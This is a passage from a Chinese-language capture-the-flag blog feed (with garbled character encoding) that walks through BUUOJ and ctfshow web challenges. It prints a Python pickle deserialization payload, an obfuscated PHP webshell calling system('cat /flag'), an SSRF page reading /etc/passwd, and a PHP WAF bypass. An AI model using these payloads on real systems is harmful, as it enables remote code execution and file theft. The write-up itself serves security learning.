href="http://www.zipæ–‡ä»¶ï¼Œä¸‹è½½è¿‡æ¥æ˜¯ä¸€å †pythonæ–‡ä»¶ï¼ŒæŒ¨ä¸ªæŸ¥çœ‹ï¼Œæ‰¾åˆ°äº†æœ‰å…³åºåˆ—åŒ–çš„ä»£ç " target="_blank" rel="noopener">www.zipæ–‡ä»¶ï¼Œä¸‹è½½è¿‡æ¥æ˜¯ä¸€å †pythonæ–‡ä»¶ï¼ŒæŒ¨ä¸ªæŸ¥çœ‹ï¼Œæ‰¾åˆ°äº†æœ‰å…³åºåˆ—åŒ–çš„ä»£ç </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>æ‰¾äº†pythonåºåˆ—åŒ–èµ„æ–™ï¼Œè¯´æ˜¯pythonååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ï¼Œé‡å†™<em>reduce</em>()é­”æœ¯æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))    <span class="comment">#æ‰“å¼€è¯»å–flag.txtçš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  <span class="comment">#åºåˆ—åŒ–payload</span></span><br><span class="line">a = urllib.quote(a)  <span class="comment">#è¿›è¡Œurlç¼–ç </span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">//c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A. è¿è¡Œç»“æœ</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹becomeå€¼å³å¯</p><img src="/2020/05/11/buuoj2/33.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-ZJCTF-2019-NiZhuanSiWei&quot;&gt;&lt;a href=&quot;#0X01-ZJCTF-2019-NiZhuanSiWei&quot; class=&quot;headerlink&quot; title=&quot;0X01:[ZJCTF 2019]NiZhuanSiWei&quot;&gt;&lt;/a&gt;0X01:[ZJCTF 2019]NiZhuanSiWei
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow</title>
    <link href="http://yoursite.com/2020/05/05/ctfshow/"/>
    <id>http://yoursite.com/2020/05/05/ctfshow/</id>
    <published>2020-05-05T03:29:39.000Z</published>
    <updated>2020-05-09T00:27:11.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="36Dæ¯"><a href="#36Dæ¯" class="headerlink" title="36Dæ¯"></a>36Dæ¯</h1><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="0X01-ä½ å–å§"><a href="#0X01-ä½ å–å§" class="headerlink" title="0X01:ä½ å–å§"></a>0X01:ä½ å–å§</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ç§è§£æ³•ï¼Œåˆ†åˆ«æ˜¯Yingå¸ˆå‚…å’ŒHA1C9ONå¸ˆå‚…çš„ï¼Œä¸‹é¢æ¥å°è¯•ä¸€ä¸‹</p><p>1.ä¹‹å‰ä¸ºäº†åšçº¢åŒ…é¢˜çœ‹è¿‡ä¸€ç¯‡pç‰›çš„æ— æ•°å­—æ— å­—æ¯RCEï¼Œåªä¸è¿‡å½“æ—¶æ²¡æƒ³åˆ°å¯ä»¥è¿™æ ·åšï¼Œä¸‹é¢æ˜¯pç‰›çš„å†™çš„webshellï¼Œç›´æ¥æ‰“å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="string">" "</span>);</span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);<span class="comment">// // ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//å†postæäº¤_=system("cat /flag");</span></span><br></pre></td></tr></table></figure><p>2.æ ¹æ®ä»£ç çš„æ„æ€ï¼Œç”¨${$<em>{7}.$</em>{8}.$<em>{12}.$</em>{19}}å¯ä»¥æ‹¼å‡‘å‡º$hintï¼Œè¿™æ ·å°±èƒ½é¡ºåˆ©ä»¥base64çš„æ–¹å¼è¯»å–hhh.phpæ–‡ä»¶äº†ï¼Œè§£å¯†å¾—åˆ°æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å¯†æºç ï¼Œå¾—åˆ°ä¸€å¥è¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST</p><p><strong>6=system(â€˜cat /flagâ€™);</strong>å°±å¯ä»¥æ‹¿åˆ°flag</p><img src="/2020/05/05/ctfshow/%E4%BD%A0%E6%8B%BF%E5%90%A7.png" class="" title="examplename"><h4 id="0X02ï¼šRemoteImageDownloader"><a href="#0X02ï¼šRemoteImageDownloader" class="headerlink" title="0X02ï¼šRemoteImageDownloader"></a>0X02ï¼šRemoteImageDownloader</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œç»™äº†ä¸€ä¸ªhttpï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Œå¯èƒ½æ˜¯ssrfæ³¨å…¥ï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°ä¸‹è½½äº†ä¸€å¼ æˆªå›¾å›¾ç‰‡</p><p>vpsç›‘å¬</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader.png" class="" title="examplename"><p>æ ¹æ®æç¤ºï¼Œå»æ‰¾èµ„æ–™ï¼Œæœ‰æ–‡ç« <a href="https://www.anquanke.com/post/id/86371ï¼Œé‡Œé¢æœ‰poc" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86371ï¼Œé‡Œé¢æœ‰poc</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨è‡ªå·±çš„vpswebæœåŠ¡ç›®å½•ä¸‹èµ·ä¸ªç½‘é¡µï¼Œå†æŠŠç›®æ ‡æ”¹ä¸ºflag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heaed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ç½‘é¡µç›´æ¥è¯»å–ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader1.png" class="" title="examplename"><h4 id="0X03ï¼šç»™ä½ shell"><a href="#0X03ï¼šç»™ä½ shell" class="headerlink" title="0X03ï¼šç»™ä½ shell"></a>0X03ï¼šç»™ä½ shell</h4><p>åœ¨ç½‘é¡µæºç å¤„æ‰¾åˆ°äº†è·³è½¬é¡µé¢ï¼Œè·³è½¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ï¼š</p><ul><li>cookieï¼Œå­˜çš„æ˜¯json</li><li>checkCookie()å‡½æ•°æ£€æµ‹jsonæ•°æ®åªæœ‰ä¸€å¯¹é”®å€¼å¯¹</li><li>secret!=$flag_md5ï¼Œè°ƒç”¨havefunå‡½æ•°ï¼Œå¦åˆ™å°±è¾“å‡ºshellåœ°å€</li></ul><p>ç»è¿‡æµ‹è¯•ï¼Œæ•°å­—&amp;0xC0éƒ½ä¸º0ï¼Œå­—æ¯&amp;0xC0éƒ½æ˜¯64ï¼Œflagçš„MD5å€¼ä¸º327a6c4304ad5938eaf0efb6cc3e53dcï¼Œåˆšå¥½æ˜¯000æ‰“å¤´ï¼Œå¼±ç±»å‹ç›´æ¥ä¸Šburpçˆ†ç ´</p><img src="/2020/05/05/ctfshow/shell1.png" class="" title="examplename"><p>æ ¹æ®æç¤ºï¼Œåˆ°ä¸‹ä¸€æ­¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//æ¸…ç©ºsession ä»å¤´å†æ¥</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯çœ‹Yingå¸ˆå‚…çš„wpåšäº†ï¼Œfuzzé»‘åå•è¿‡æ»¤äº†ä¸€ä¸‹ä¸œè¥¿</p><ul><li>fã€sysã€include</li><li>æ‹¬å·ã€å¼•å·ã€åˆ†å·</li><li>^ &amp;ç­‰è¿ç®—ç¬¦</li><li>ç©ºæ ¼ / \ $ ` * #ç­‰ç¬¦å·</li></ul><p>è¿™é‡Œå¸¦æ‹¬å·çš„å‡½æ•°ï¼Œç©ºæ ¼ï¼Œåˆ†å·éƒ½ä¸èƒ½ä½¿ç”¨ï¼Œå‘½ä»¤æ‹¼æ¥ä¹Ÿæ— æ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br><span class="line">&#x2F;&#x2F;ç”¨?&gt;&lt;?æ¥bypassåˆ†å·</span><br><span class="line">&#x2F;&#x2F;PHPé»‘é­”æ³• requireå’Œå–åè¿ç®—ç¬¦ä¹‹é—´ä¸éœ€è¦ç©ºæ ¼ç…§æ ·æ‰§è¡Œ</span><br><span class="line">&#x2F;&#x2F;æ²¡æœ‰æ‹¬å· ä½¿ç”¨é‚£äº›ä¸éœ€è¦æ‹¬å·çš„å‡½æ•° è¿™é‡Œä½¿ç”¨require</span><br><span class="line">&#x2F;&#x2F;]&#x3D;1æ¥é—­åˆsession</span><br></pre></td></tr></table></figure><img src="/2020/05/05/ctfshow/shell2.png" class="" title="examplename"><p>æ‹¿åˆ°flag</p><h4 id="0X04ï¼šWEB-ALL-INFO-U-WANT"><a href="#0X04ï¼šWEB-ALL-INFO-U-WANT" class="headerlink" title="0X04ï¼šWEB_ALL_INFO_U_WANT"></a>0X04ï¼šWEB_ALL_INFO_U_WANT</h4><img src="/2020/05/05/ctfshow/want1.png" class="" title="examplename"><p>çœ‹åˆ°æç¤ºï¼Œç”¨æ‰«æå™¨æ‰«åˆ°index.php.bak,ä¸‹è½½æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">really really really baby challenge right?</span><br></pre></td></tr></table></figure><p>httpå›åŒ…headerå¾—çŸ¥æ˜¯nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 